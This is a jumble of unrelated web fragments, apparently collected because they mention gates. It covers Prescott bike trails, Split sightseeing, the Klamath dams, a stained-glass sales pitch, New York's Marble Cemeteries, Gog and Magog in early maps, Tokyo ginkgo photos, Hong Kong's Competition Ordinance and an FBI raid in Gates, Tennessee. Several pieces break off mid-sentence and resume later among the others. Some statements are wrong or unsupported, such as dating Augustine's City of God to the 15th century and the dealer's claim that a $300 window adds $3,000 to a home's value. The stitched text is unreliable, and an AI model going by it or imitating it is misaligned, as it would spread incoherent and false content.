want.&#xa0;Definitely&#xa0;do loops counter-clockwise though or you will miss out on the best part of the ride. Big loop is still only about 10 miles, trail#351, cross parking lot, up trail #346 through gate, turn left on #347 through second gate, bomb downhill, intersection at 348 turn left if you are tired already, if not go straight to Mint Wash Trail #345 turn left. Follow trail along wash back to go. I would recommend this for intermediate rides. &#xa0;I usually use the Cayuse trail head or ride in from trail 332 via 341 or 347 willow trail.</p>   <p>&#xa0;</p>   <p>. &#xa0;This is a fun but cardio intensive ride at 4.5 miles will give you a good work out.&#xa0;The trail starts at the White Spar campground just off of White Spar Road just minutes south of downtown Prescott. A winding climb brings you to a small overlook with good views of the mountains west of town. Then a short downhill to the pond and the real climb begins. The first 1/4 mile is the toughest then it steps it&#x2019;s way to the saddle. Be sure to look off to your left while you climb to see Goldwater Lake. Then a gentle downhill through the trees and the final climb up to Senator Highway.</p>   <p>&#xa0;</p>   <p>This is a trail that &#xa0;encompasses&#xa0;the majority of Prescott trails. going around the city. Has total length 56.9 miles. Can be done in one, two, or more days. There are many places where support and/or camping is available. This ride is largely single-track, about 1-1.5 miles of pavement, and a little double-track thrown-in. &#xa0;Click on link or picture for more details.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>. One of the Mountain Biker Lady&#x2019;s favorites!.&#xa0;Part of the , Trail #332 rises and falls over the hilly terrain of Arizona&#x2019;s central highlands. Exposed slopes of chaparral and pinyon-juniper woodland are interspersed with shady groves of ponderosa pine where a variety of bird calls can be heard ringing out from among the trees. There are nice views of both Thumb Butte and Granite Mountain&#x2014;Prescott&#x2019;s most prominent landmarks. This trail is notable because it provides a route between these two features. Best to go up to Thumb Butte road and park in dirt lot where trail 218 starts over 1.5 miles past Thumb Butte Rec Area. </p>   <p>&#xa0;</p>   <p><em> This kicked Mountain Biker Lady&#x2019;s bum</em>. Each year puts on an event the 15, 30 and 50 proof race events. The Whiskey Off-Road 30 Proof course begins with a brief stay and steep climb on the pavement heading out to the endless singletrack offerings located in Prescott National Forest. Once in the forest, the route features technical singletrack, burly water bars, daunting creek crossings, smooth fire roads, quality climbing, and awesome vistas. For all the details click on the link above to get the full route. This is high intermediate to advanced skills course.</p>   <p>. There are a series of semi technical trails at the recreation area.&#xa0;These trails are open to hikers, horseback riders, and mountain bikes. Horses, however, are not permitted in the picnic area and riders must access these trails by way of FR 9401B, located 0.9 miles west of the Thumb Butte area parking lot.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>Here are some other trails in the area  </p>   </div>

   <div>   <section>    <div>     <div>      <div>       <div>        <h3>Split, general info</h3>       </div>       <div>        <p>Split has a Mediterranean climate, characterized by dry and very hot summers and cool, but moderate and humid winters. Average temperature of the warmest month of the year is 22&#xb0;C, and the coldest 4&#xb0;C. Also there are the numerous beaches with extraordinarily clean sea. Ba&#x10d;vice is a phenomenon of nature, a sandy beach at the heart of the city, in the vicinity of the city harbor, and it can accommodate over ten thousand people. During the low tides in springtime Ba&#x10d;vice turn into a split version of Copacabana where many famous soccer players first displayed their talent, where the rugby in Split was born, where even in wintertime a unique game of &#x201c;picigin&#x201d; is played (a sort of volleyball, played in the sea shallows with a small ball). Ba&#x10d;vice today represents a best known promenade for all generations, and during nighttime is the favorite center of nightlife. </p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>Marjan, Forest Park</h3>       </div>       <div>        <p>Marjan Forest Park covers the westernmost tip of Split Peninsula. It is a green oasis, which has been cherished by the citizens of Split for generations and is considered the &#x2018;lungs of the city.&#x2019; It covers a vast area and offers a myriad of activities and sites. There are countless paths what wend through the forests and along the coast, revealing a well-tendered landscape, jagged beaches, vista points, ancient chapels, and even a zoo. You can take an easy stroll or a jog to the peak of Marjan hill, Telegrin, at 178m above sea level. Alternatively, conduct your Marjan discovery on bike, which you can rent from the Northern Entrance to the park, there are plenty paved roads and off-road routes to choose from. It is prohibited to drive through Marjan Forest Park but you can park by the Northern Entrance. You can also get to Marjan from the city by climbing the stairs to Vidilica from the Varo&#x161; neighborhood west of Riva. </p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>Riva, seaside promenade of the city</h3>       </div>       <div>        <p>The Riva started to look the way it does today two centuries ago, when the French, in time of Napoleon ruled these parts through Marshal Marmont. Today this promenade is the cities living room, the most popular and most important public place in Split. In the meantime it has been widened and reconstructed several times, but it was always blessed with the most spectacular set, the south facade of the Diocletian Palace, with the entrance into the Substructures, also the Franciscan monastery with the church of St. Francis, and the Bajamonti De&#x161;kovi&#x107; Palace and the Port Authorities building on the east end. Riva today is thrusting with Caf&#xe9;s and restaurants, an ideal place for having your morning or afternoon coffee, or for an evening out with friends over drinks. Riva is the stage of the city life of Split, a venue for numerous cultural, political and entertainment events. Naturally, Riva is always at its best in time of Sudamja, a celebration dedicated to St. Domnius, the patron saint of Split.</p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>Diocletian&#x2019;s palace</h3>       </div>       <div>        <p>The historic core of Split with Emperors Diocletian palace is among the most important works from the late Roman period and it is entered on the list of UNESCO world heritage. The palace is rectangular (215x180m), with two wide vertically crosed streets which lead from its centre towards the four doors in the centre of each side of rectangle. Its south side had a residential character &#x2013; the emperor quaters and auditoriums. In the north section was the military factory where woolen uniforms were made. It was supplied richly with water from the 9 km long aqueduct from the spring of river Jadro nearby Solin, with the capacity of 129600 m3 a day, sufficient for Split today, a town with 200.000 inhabitants. In the 16th century palace doors were named: Golden Gate-North, Silver Gate-East, Iron Gate-West, Bras Gate-South. Golden Gate is among the most preserved examples of its kind in antique period.</p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>Religion buildings in Palace</h3>       </div>       <div>        <p>Main streets come together in the middle of the Palace. South of them is Peristyle, an open space surrounded on the west and east side by the monumented columns with arches directed towards Emperor&#x2019;s quarters. Peristyle was intended for Diocletians cult, and he demanded to be honored as the living son of Jupiter. During the history Peristyle remained a religius central point. The Emperor&#x2019;s mausoleum is octogonal from the outside, of the inside it is of a round shape, with niches among which eight Corinth columns of red granite rise up. It is converted into a Christian church at the beginning of the 5th century, and by the end of the 7th century it becomes cathedral. By lithurgical inventory it is one of the most suggestive and the most worthy sacreal places. In the middle of the 13th century the building of the belfry began on the very place where the prostasis of the late mausoleum once was. Its ground floor is actualy a reconstruction of the idea of antique triumphal arch and it is accorded with arcades of Peristyle. Near Golden Gate is church 1.64m wide and 10m long. It used to be the passage for watchmen who would secure the entrance into the Diocletian Palace. At the beginning of the 9th century it was turned into a Christian church and consecrated to Saint Martin.</p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>History of Split</h3>       </div>       <div>        <p>Although the city was originally inhabitated since the 6th century BC as a Greek colony named Aspalathos, todays Split officially counts its years from 295 AD, the starting year of the construction of Diocletian&#x2019;s Palace, which became the very heart of the future city. Romans conquered Illyrians (3rd century BC), and established the Province of Dalmatia, with Salona as the capital. Nearby Aspalathos was renamed to Spalatum. When Salona was destroyed by Avars in the 7th century, its displaced Romanic citizens sought refuge in deserted Diocletian&#x2019;s Palace and turned the former private residence into a town. After the fall of the Western Roman Empire, Spalatum became part of Byzantium, with political autonomy. In the 11th century, the city was integrated within the Kingdom of Croatia and later fell under the Croatian &#x2013; Hungarian rule, keeping a significant independence. Despite the reduced autonomy during The Venetian rule (1420-1797) period, Split developed into an important trade port.

The four dams are <b>Iron</b> Gate, J.C. Boyle, Copco 1 and Copco 2 dams on the Klamath River.

   <div>   <p><span>In a stroke of pure genius (Gaines is not the modest type), I decided to create a business plan based upon two antique items-of-interest: the wrought iron gate and the stained glass window. Why? Because I had learned (i.e., witnessed) that these two items are <strong>the two most influential antiques</strong> with respect to increasing both the perceived and <strong>the real value</strong> of a home.</span></p>   <p>Why these two antiques? {pls quote me!} &#x201c;Out of all architectural antiques and/or elements, the stained glass window has the highest &#x201c;exponent value&#x201d; when it comes to enhancing the enjoyment and beauty in a home&#x2019;s d&#xe9;cor, <strong>and increasing its resale value!</strong></p>   <p><span>It is an established fact (in the antique retail field and real estate world) that a single stained glass, appropriated in a dwelling, will increase the value (via pre and post appraisal) disproportionate to the cost of the glass.&#x201d;</span></p>   <p>In short the home will appraise for substantially more if you place a better-than-average (your taste) stained glass in the foyer, bedroom, living room, alcove, etc. Instantly the house becomes a unique home.</p>   <p>The stained glass becomes the focal point in the domain. The stained glass will &#x201c;out shine&#x201d; hardwood floors, teak paneling, grande pianos, and grandpa&#x2019;s clock. Specifically, a three hundred dollar ($300) piece of stained glass (*) will increase the market value by $3,000. That&#x2019;s right!</p>   <p>The implication of this astounding claim is astonishing! Enormous! Thus, if the average spec-house builder (Democrat, Republican, or Independent) would add a single stained glass window to a $350,000 home, the real estate agent could relax and afford a ticket to the Bahamas. (That is as near a fact as I care to go!)</p>   <p>(*) FYI: most stained glass in our inventory appraises for $100 per square foot.</p>   <p>If a new house owner / builder/ designer / investor / architect / under-writer / interior-designer / mortgage broker / artist / music-teacher / mama and papa would perform this same act-of genius (yup: put in one (1) stained glass panel), then we (you and me) could revolutionize home construction, home d&#xe9;cor, remodeling, and home finance&#x2026;..</p>   <p>I {Gaines Steer} stake my reputation on this!!! (In all my years of antique-dealing I have never told a (cyberspace) lie.)</p>   <p>&#xa0;</p>   <div>    ________________   </div>   <p>R.

   <div>   <p>From the New York <em>City </em>Marble Cemetery</p>   <p>Two rarely seen artifacts of the East Village swung open their iron gates this weekend for Open House NY, New York&#x2019;s two oldest cemeteries &#x2014; the New York Marble Cemetery and the New York City Marble Cemetery. (Yes, you read that right.)</p>   <p>In a few respects they are the Paris and Nicole of ancient burial grounds &#x2014; virtually identical and marked with occasional rivalries &#x2014; however these unique New York landmarks are literally all depth, little surface. For below the serene, manicured lawns of both places lie the crypts of hundreds of 19th century New York&#x2019;s leading families.</p>   <p>Before Green-Wood became the fashionable place to rest in peace, wealthy New Yorkers were lured to very first marble cemetery, opened in 1830. Unlike a traditional church cemetery, the New York Marble Cemetery (still listed at 41&#xbd; Second Avenue) was strictly a profit-generating venture of Perkins Nichols, who with a board of trustees purchased farmland funded by families already lined up to buy underground vaults.</p>   <p>Threats of disease during the early 1800s forced city officials to ban burials in lower Manhattan, below Canal Street. One of Nichols appeals was the Tuckahoe marble used to make the vaults; it was believed that disease was spread from traveling miasma which emanated from dead bodies, however the sturdy marble was believed to contain this effectively.</p>   <p>At $250 a pop, families could book themselves at this &#x201c;Place of Interment for Gentlemen,&#x201d; which eventually housed 156 vaults. The cemetery , as old moneyed families usually had their own family plots at their country homes. Today it looks like an out of place backyard with fresh green grass and a few trees. Vault markers are placed on the walls surrounding the lawn.</p>   <p>At the New York City Marble Cemetery a block away, the vault markers are affixed into the earth, sharing space with a few traditional grave markers. Trustees hired Nichols to open this plot a little less than a year later, in 1831, due to the success of the original. Not only is it a little larger &#x2014; with 258 vaults underfoot &#x2014; but it&#x2019;s readily viewed from Second Street through the bars of some very rustic iron gates.</p>   <p>Although New York Marble Cemetery was first, New York <em>City </em>Marble Cemetery held a loftier roster of permanent residents, including New York Public Library benefactor . Who you will no longer find here, however, is fifth president of the United States James Monroe, who was laid here at his death in 1831 and moved back to Virginia in 1858.</p>   <p>Below: the more dramatic New York City Marble Cemetery</p>   <p>Both cemeteries lost permanent inhabitants once Green-Wood opened, with families preferring to relocate their loved ones to the larger, more landscaped setting. In the 1890s, almost successfully petitioned to have the original marble cemetery turned into a children&#x2019;s playground, but the plan was later abandoned.</p>   <p>You can find more info at their official websites &#x2014; and .</p>   <p>I highly recommend swinging by either next time they&#x2019;re open. In fact, New York Marble Cemetery, hidden away through an alleyway and thus far more quiet, is even open for parties and events. Who wouldn&#x2019;t want to throw a wedding reception here?</p>  </div>  
   <div>   <small>Thursday, April 1st, 2010</small>   <div>    <div>     <p>Gog and Magog in Sanson's 1691 Map of the World</p>    </div>The appearance of the lands of Gog and Magog in many early maps is one the most interesting and enduring examples of Biblical lore being translated into the cartographic medium. The kingdoms of Gog and Magog appear in many early maps of Asia and the World produced between about 1200 to 1750. Generally these kingdoms are situated somewhere west of the Caspian Sea and, more frequently, to the north of China around Mongolia or Siberia. How did they get there?    <p>The tale of Gog and Magog is, of course, Biblical in origins with elements in Jewish, Christian and Islamic traditions. They appear in Genesis and Ezekiel as cursed grandchildren of Noah and are set up early on as enemies of the righteous. The most alarming mention of Gog and Magog appears in Revelation 20:7-8: </p>    <p><em>&#x2026; And when the thousand years are finished, Satan shall be loosed from his prison, and shall go out to seduce the nations which are in the four corners of the earth, Gog and Magog, and shall draw them to battle, whose number is as the sand of the sea&#x2026;</em> </p>    <p>But who exactly where Gog and Magog and where did this terrifying empire have its lands? The Biblical location &#x201c;the four corners of the earth&#x201d;, is not exceptionally helpful save that it puts these nations at the extreme edge of existence. The Jewish historian Josephus associates Magog with the Scythians. In antiquity Scythia was an empire to the north of Parthia or Persia that included much of central Asia as far east as India and Tibet. </p>    <div>     <p>The Building of Alexander's Gates from an early Arabic manuscript.</p>    </div>The Alexander Romance, a c. 300 CE compendium of stories and myths associated with Alexander the Great, brings Gog and Magog into a historical context. Apparently when Alexander marched his army into the Caucuses he discovered a people beset and harassed by the empires of Gog and Magog to the north. Alexander responded to this threat by constructing an enormous wall of adamantine between two mountains known as the &#x201c;Breasts of the World&#x201d;. Today this is commonly associated with the Caspian Gates of Derbent. This mighty wall, reminiscent of the Great Wall of China, stretches some forty kilometers between the Caspian Sea and the nearby mountains, effectively blocking passage through the Caucuses. Though Alexander had nothing to do with this wall, it was actually constructed by the Sassanid Persians to defend against Gokturk invasions, it does once again place the lands of Gog and Magog somewhere to the north and west of the Caucuses.    <p>Pliney too locates Gog and Magog behind a great set of gates in the Caucuses, describing a place where the mountains have been torn asunder and &#x201c;gates have been placed, with iron covered beams, under the center of which flows a river emitting a horrible odor with ; and on this side of it on a rock stands the fortress called Cumania, erected for the purpose of barring the passage of the innumerable tribes.&#x201d; </p>    <p>The Qur&#x2019;an next takes up this story and adds its own more mythical element. The great hero Dhul Qarnayan (literally &#x201c;two-horned one&#x201d;, a reference to the ram horns Alexander wears on coins minted during his rule to indicate his descent from the Egyptian god Amun) is said to have walled the infernal armies of Gog and Magog behind a great gate where they will remain &#x2013; until doomsday. At this point, </p>    <p><em>when Gog and Magog are let loose and they rush headlong down every height (or advantage). Then will the True Promise draw near.</em> (Qur&#x2019;an 21:96-97). </p>    <div>     <p>Al-Idrisi's World Map with Gog and Magog behind the wall and circled in red. Note, this map is oriented to the south so here Gog and Magog are in the proximity of China.</p>    </div>In the 9th century the Caliph Al-Wathik-Billa actually sent out an expedition, under one Sallam the Interpreter, to discover the Gates of Alexander. Sallam is said to have searched the Caucuses high and low without success before heading deeper into Asia where he discovered the mighty wall. Sallam&#x2019;s report influenced a number of important Islamic geographies, most importantly for this story, the 12th century geographer Muhammed al-Idrisi, who was employed by the Sicilian monarch Roger II. Idrisi directly associates Alexander&#x2019;s Gates, and consequently Gog and Magog, with the Great Wall of China. Idrisi&#x2019;s work includes some of the most sophisticated and advanced cartographic work of pre-modern Europe and profoundly influenced European cartography for the next several hundred years. Though not widely distributed in his lifetime, nor solely responsible for the presence of Gog and Magog in later European maps, the influence of Idrisi&#x2019;s map and geographical notations cannot be ignored in any consideration of how these Biblical kingdoms/figures entered the mainstream of later European cartography.    <p>In the rest of Europe, tales of Gog and Magog and the horrors associated with them were a constant element in mediaeval religious rhetoric, which preached of an imminent &#x201c;end of days&#x201d;. Saint Augustine in his 15th century religious classic &#x201c;City of God&#x201d; discourses at length on the duo suggesting that when &#x201c;final judgment is imminent . . . the whole city of Christ being assailed by the whole city of the Devil, as each exists on earth . . . which he names Gog and Magog&#x201d;. Augustine did not associate Gog and Magog with an actual place, but rather with an evil that existed all around us. Even so, this concept must have been too abstract for the medieval man who continued to look for the lands of Gog and Magog. History was about to oblige. </p>    <p>In 1241 CE the hoards of Ghengis Khan swept out of Asia destroying and conquering everything in their path. The brutal, efficient, and alien Mongols must surely have seemed to be the wrath of god unleashed &#x2013; the prophesied end of days had come and with it, Gog and Magog. One Russian chronicler says: &#x201c;In those times there came upon us for our sins unknown nations. No one could tell their origin, whence they came, what religion they professed. God alone knows who they were, God, and, perhaps, wise men learned in books.&#x201d; The period of the Mongol invasions lasted roughly from 1241 to 1285 CE. Nonetheless, after devastating the Chinese Empire, sacking Baghdad, laying waste to Russia, and storming into Croatia, Hungary, Lithuania, and Poland, the invincible hoard simply vanished &#x2026; or so it must have seemed in Europe. In fact, beset with internal political turmoil and the death of the Great Khan, the hoards retreated to Central Asia in order to reorganize. At this time Europe, who had yet to rediscover Ptolemy and truly develop a modern cartographic tradition, wasn&#x2019;t actively making maps, but when it did, a place of origin Tartars or Mongols (Gog and Magog) would have to be identified. </p>    <div>     <p>1697 Rossi Map of Asia - Magog appears north of China.</p>    </div>Marco Polo, in his Travels, is possibly the first European literary figure to identify Gog and Magog with the Tartars. Polo, claimed to have lived in China from 1271 to 1298, where he became an important functionary in the court of Kublai Khan. Polo worked for years as an emissary of the Great Khan and traveled extensively throughout the vast empire. Much of the information about Asia appearing on early maps of the continent, including the Vinland Map and the Waldseemuler Map, can be directly linked to Polo&#x2019;s narratives. Polo associates Gog and Magog with the lands of Tenduk, a province to the north of China ruled by Prester John. In Polo&#x2019;s narrative Gog is translated as Ung and Magog is the home of the Tartars. Ibn Battuta, the great 14th century Moroccan traveler, referring to the tale of Dhul Qarnayan, supports Polo by himself connecting the Great Wall of China with the gates setup to restrain Gog and Magog, &#x201c;Between it   <div>    <div>    <p>Stoneyford Engineering has been in operation since 1972, based in Stoneyford, Co.

   <div>     <div>          <div>     <p>Autumn sky in Japan implies CLEAR and BLUE skies. They are called as Aki-bare, &#x79cb;&#x6674;&#x308c;. Mornings start with early sunrise and sunset by 05:00 p.m. It is one of the best seasons to capture HDR shots with thin cloud layers in early morning of blue hour photography in early evenings. The autumn colors add the overall colorful ambience to photographs during this period. Here is a photo shoot done in HDR at the National Diet Building near Kokkai Gijidou Mae Station in Tokyo.The National Diet building was off limits on a early morning this week when I went there at 06:00 types, but there was good sunshine coming in from the left side illuminating the premises with beautiful thin clouds in the sky. This is ideal for a HDR shot. The road leading to the National Diet Building is lined with beautiful Ginkgo Biloba trees, the leaves of which turn yellow in autumn. Called as &#x201c;Ichou&#x201d;, the trees blossom by last half of November and this week the status was full colors&#x2026;The National Diet Building itself had very few visitors that early morning with a lone patrol car as always guarding the entrance. Some other visitors were at the gate peeping in from the iron gate in front.The trees had not only changed colors, but there were also leaves which had fallen on the street and already the streets were lined up with beautiful carpet of leaves. If you go after the afternoon mostly the leaves are cleared by the metropolitan staff on a daily basis so you need to catch the fallen leaves only in the early mornings.People tend to crowd locations like Meiji Gaien Outer Garden, Ueno Park and other locations for fall leaves, but all these locations end up being crowded that the &#x201c;serene&#x201d; aspect is somehow lost and I usually have been strolling at this location at least once per season.&#xa0;The yellow contrast &#xa0;with the Diet Building in the background. Natural beauty contrasted with architectural beauty.Notice the lack of visitors in the lanes around the Kokkai Gijidou and the peaceful streets with yellow colors.Location of the street where there are at least 80-100 trees with the best season to visit last week of November. Access from the Tokyo Metro Kokkai Gijidou Mae Station on the Marunouchi Line. Beautiful morning, one more shot&#x2026;. Collected a few Ginkgo Biloba nuts, yes the quite smelly nuts which are inedible but have been gathering attention on being having medicinal benefits. They have been said to help with controlling and stabilising blood sugar levels which is something a Gingko Biloba tree that can live for 1000 years has to offer to us. Hopefully more research in this direction brings some new treatments. It also has other medicinal benefits. One final shot, hope you find a new spot in the city and experience Tokyo sutumn in a serene environment.</p>     <div>      <h3>Related Posts:</h3>     </div>     <div>      <div>       <h3>Share this article on :</h3>      </div>     </div>    </div>    </div>    </div>

   <div>   <p>By&#xa0;George W. Russell</p>   <p><em>Hong Kong&#x2019;s Competition Ordinance, expected to be fully effective next year, is designed to provide a legal framework to prohibit and deter any anticompetitive conduct. George W. Russell looks at how it is likely to take shape, how it will affect business and what it could mean for accountants.</em></p>   <p>When Hong Kong&#x2019;s Housing Author&#xad;ity needed an or&#xad;der of stainless steel gates for its proper&#xad;ties, it called a tender. However, a group of seven manufacturers had already decided who would win and at what cost.</p>   <p>The manufacturers met to set a minimum price and one of them, Gammon Iron Gate Co., was desig&#xad;nated to bid at that price. The rest sent bids at much higher prices. Gam&#xad;mon won the contract, sold the gates and distributed profits equally to each manufacturer through a com&#xad;pany acquired for the purpose, and named, not ironically, Everwin.</p>   <p>When the authority discovered what had happened, it accused the manufacturers of fraud and the In&#xad;dependent Commission Against Cor&#xad;ruption arrested several directors. However, the Court of First Instance ruled that no violations had been committed, due to the absence of an anti-trust law.</p>   <p>Colluding manufacturers are known as a &#x201c;cartel,&#x201d; a closed group of suppliers setting prices. In many countries, such behaviour is illegal, but not in Hong Kong, as the steel gate case highlighted. &#x201c;This kind of cheating is against the public interest and should be discouraged in strong terms,&#x201d; Judge Louis Chan wrote in his 2010 ruling in Sit Kam Tai v. Gam&#xad;mon Iron Gate Co.</p>   <p>Once the Competition Ordinance (Chapter 619 of the Laws of Hong Kong) is enforced from next year, such practices will be outlawed. The legislation will add a new aspect of compliance for companies, but ac&#xad;countants say they are unfazed by the coming law.</p>   <p>&#x201c;We welcome the new competi&#xad;tion law,&#x201d; says Wendy Yung, Execu&#xad;tive Director and Company Secretary at Hysan Development Co., and a Hong Kong Institute of CPAs mem&#xad;ber. &#x201c;An open and competitive envi&#xad;ronment is key to Hong Kong being an international financial and busi&#xad;ness centre.&#x201d;</p>   <p>More than a decade in the making, the ordinance seeks to (a) prevent collusive behaviour among groups of undertakings (defined as any entity engaged in economic activity) and (b) prevent individual undertakings from deterring competition.</p>   <p>&#x201c;The ordinance provides a legal framework to prohibit and deter anticompetitive conduct which pre&#xad;vents or distorts competition in Hong Kong,&#x201d; says Daisy Chan, Executive Director, Public Affairs and Corpo&#xad;rate Services, of the Competition Commission, the agency set up to ad&#xad;minister the ordinance.</p>   <p>Already, the commission has been established with the appointment of 14 members. The chairperson is Anna Wu, an Executive Councillor and former chair of the Consumer Council. Recruitment for the com&#xad;mission&#x2019;s executive has begun with the hiring in March of two senior figures from the Australian Competi&#xad;tion and Consumer Commission.</p>   <p><strong>Principal concerns</strong></p>   <p>The commission will be granted investigative powers to apply the new law. Cases prosecuted by the commission will be heard before the Competition Tribunal, which is to be headed by a President, Godfrey Lam, and a Vice-President, Queeny Au-Yeung. Other members have yet to be appointed.</p>   <p>How much power the commission and tribunal will have remains to be seen. The passage of the ordinance was controversial, encompassing years of hearings and debates, several amendments and a last-minute filibus&#xad;ter in the Legislative Council.</p>   <p>Officials revised the bill several times, cre&#xad;ating more lenient penalties and exempting small- and medium-sized enterprises from many provisions. None of the amendments lawmakers proposed to strengthen the bill were approved. The bill barely passed LegCo with only 31 of the 60 possible votes in favour.</p>   <p>An exemption was granted to all but six stat&#xad;utory authorities, over many public objections, while agreements among smaller companies (those with turnover of less than HK$200 mil&#xad;lion are excluded from the ordinance.</p>   <p>Many industry sectors that will be affected will need to be aware that business practices which may not have been illegal in the past, as bid rigging and abuse of a dominant market po&#xad;sition to prevent competition will be outlawed.</p>   <p>&#x201c;Those are the most common anticompeti&#xad;tive practices,&#x201d; says Derek Lai, Managing Part&#xad;ner, Financial Advisory Services, at Deloitte Greater China and an Institute member.</p>   <p>Price fixing is another matter that will be closely monitored. &#x201c;Given that price fixing is [currently] perfectly legal, there is every rea&#xad;son to believe that it is common,&#x201d; says Thom&#xad;as Cheng, Associate Professor of Law at Hong Kong University and Chairman of the Competi&#xad;tion Policy Committee.</p>   <p>The commission says it will not target spe&#xad;cific industries. &#x201c;It is too early for us to indicate enforcement priorities for the time being,&#x201d; says Chan at the commission. However, most anti&#xad;competition legislation worldwide is orientated towards protecting consumers.</p>   <p>&#x201c;The chairperson and commissioners have backgrounds in law, economics and industry and bring a strong consumer focus to the commis&#xad;sion,&#x201d; says Ninette Dodoo, Counsel at the Fresh&#xad;fields Bruckhaus Deringer law firm in Hong Kong.</p>   <p>Given this background, consumer-facing in&#xad;dustries such as healthcare, leisure, retail and finance, could more likely become targets.</p>   <p>&#x201c;Investigations in these sectors might also prove popular,&#x201d; points out Annalisa Heger, an Associate at Freshfields. &#x201c;[This] could be important to an au&#xad;thority looking to establish its credi&#xad;bility and set its own agenda.&#x201d;</p>   <p><strong>Rolling up sleeves</strong></p>   <p>A century ago, the most severe penalties for cer&#xad;tain breaches of competition legislation were enforced demergers, such as the break-up of John D. Rocke&#xad;feller&#x2019;s Standard Oil in 1911 ordered by the Supreme Court of the United States. (See <em>A history of trust-busting</em> below.)</p>   <p>In Hong Kong, the maximum pecuniary penalty under the Competition Ordinance is up to 10 percent of the domestic turnover of the undertaking concerned in the three of the previous five years with the highest turnover. (Many competition regulators im&#xad;pose fines of up to 10 percent of a company&#x2019;s global turnover.)</p>   <p>The tribunal can also disqualify direc&#xad;tors for up to three years, says Dodoo at Freshfields. &#x201c;This is where the tribunal is satisfied that the director contributed to the contravention of the rule; or had reasonable grounds to suspect the contravention and took no steps to prevent it; or ought to have known that the conduct of the undertaking constituted a contravention.&#x201d;</p>   <p>Complying with the legislation will re&#xad;quire a rethink of many business practices, such as contracts, pricing strategies and pro&#xad;curement processes. &#x201c;I think the first step is education, beginning with a company&#x2019;s management and personnel who will lead in getting it ready for the ordinance,&#x201d; says Yung at Hysan. &#x201c;CFOs and finance teams are in a good position to take key roles.&#x201d;</p>   <p>Lai at Deloitte recommends that Insti&#xad;tute members conduct an assessment or competition compliance audit to identify any po&#xad;tential areas of risk in respect of their current ar&#xad;rangements. &#x201c;The company should develop a com&#xad;petition compliance policy or, if they have one in place already, check whether any amendments are required,&#x201d; he says.</p>   <p>Law firms are also assisting clients on aspects of the ordinance. &#x201c;We can identify the high-risk are   <div>   <div>    <div>     <div>      <noscript>       <div>        Please enable Javascript to watch this video       </div>      </noscript>     </div>    </div>   </div>   <p>(<b>Gates</b>, TN) An&#xa0;FBI task force shut down an auto parts and scrap metal company in <b>Gates</b>, Tenn., for most of the day Thursday.</p>   <p>Workers were sent home as the FBI executed a search warrant at Wright's Auto Parts and Metals on Wardlow Street.</p>   <p>The raid was a complete surprise to workers, who had barely started their day.</p>   <p>&quot;I&#xa0;don't know what's going on.

With the rediscovery of Ptolemy&#x2019;s Geography by Italian humanists and the development of a sophisticated European cartographic tradition the need for more advanced and updated Ptolemaic maps emerged. Many of these maps referenced Polo and al-Idrisi in adding Gog and Magog in the unknown lands of east Asia, thus influencing the cartographic representation of this area for centuries to come.    <p>Today Gog and Magog are considered by many scholars to be a Jungian representation of &#x201c;the other&#x201d;, &#x201c;the frontier&#x201d;, or both. </p>    <p><strong>References: (partially researched by Lindsay McMullen)</strong> <small>Augustine, Saint, The City of God, (Translated by Marcus Dods), page 658.

as of their business such as units that set prices and other terms,&#x201d; says John Hickin, a Partner with the Mayer Brown JSM firm.</p>   <p>Units that have regular dealings with competi&#xad;tors, as well as suppliers and customers, are anoth&#xad;er cause for concern, Hickin adds. &#x201c;Start thinking about promoting awareness internally,&#x201d; he advises. &#x201c;Particularly for the finance industry, it is import&#xad;ant to be aware that cartel activity relies on the un&#xad;lawful exchange or disclosure of competition-sensi&#xad;tive information among competitors.&#x201d;</p>   <p>Industries likely to face particular scrutiny, such as construction, are urged to pay particular atten&#xad;tion to their policies. &#x201c;Internal procedures should be in place to minimize the company&#x2019;s exposure to any liability risks, thereby mitigating the likeli&#xad;hood of an investigation,&#x201d; suggests Christopher To, Executive Director of the Hong Kong Construction Industry Council.</p>   <p><strong>Preparing the ground</strong></p>   <p>The Competition Commission will spend the next 12 to 18 months drafting guidelines, carrying out con&#xad;sultations and educating the business community, says Chan at the commission, adding that consulta&#xad;tions with stakeholders and members of the public will begin during the first half of this year.</p>   <p>Yung at Hysan urged Institute members in busi&#xad;ness that early preparation would help them partic&#xad;ipate in the guidelines consultation process. &#x201c;This will also enable you to assist your organiza&#xad;tion in educating business units, auditing business practices, and adjusting business behaviour as appropriate,&#x201d; she says.</p>   <p>Hickin said there was no clearly articu&#xad;lated economic policy in its ordinance other than to enhance economic efficiency and the free flow of trade. &#x201c;This leaves the courts and the Competition Commission room to set policy,&#x201d; he says.</p>   <p>As more data become available, individu&#xad;al sectors will be assessing the likely impact. &#x201c;The construction industry in Hong Kong is preparing itself for the enactment of the law and has made submissions to LegCo,&#x201d; says To. &#x201c;Industry stakeholders are wait&#xad;ing to know more about its actual operation through reviewing official guidelines, deci&#xad;sional practice and case law to clarify exactly how it will apply when it is full swing.&#x201d;</p>   <p>He points out that some aspects of the or&#xad;dinance require further clarification. &#x201c;Some unclear definitions include &#x2018;predatory pric&#xad;ing&#x2019; under sections 21-24 and &#x2018;a substantial degree of market power&#x2019; under section 35 of the ordinance.&#x201d; Neither concept is specifical&#xad;ly defined under the ordinance with any kind of figure or threshold.</p>   <p>The commission says it is eager to work with businesses to develop clear policies and guidelines by the time the ordinance be&#xad;comes fully effective. &#x201c;[We plan] to discuss with the business community on how to de&#xad;velop risk management systems, good prac&#xad;tices and internal controls as tools to achieve compliance with the ordinance,&#x201d; says Chan.</p>   <p>However, the commission urges compa&#xad;nies to put as much as possible in place as soon as possible. As Chan says: &#x201c;This will help correct potential anticompetitive be&#xad;haviour even before the ordinance takes full effect.&#x201d;</p>   <p>This article was originally published in the May 2014 issue of <em>A Plus</em>.</p>   <p>[stextbox id=&#x201d;info&#x201d; caption=&#x201d;A HISTORY OF TRUST-BUSTING&#x201d;]</p>   <p>Anti-competition rules have their roots in medieval English common law, but the first modern competition legislation was that of Canada in 1889. The United States followed suit in 1890; there it became known as anti- trust legislation and broke up monopolies in railways, oil, livestock and tobacco.</p>   <p>Another long-term focus has been pub&#xad;lic procurement, where collusive practices and bid rigging drove up the cost of govern&#xad;ment tenders. The U.S. pursued govern&#xad;ment bid-rigging cases as early as the 1890s and it remains a global issue to this day, as 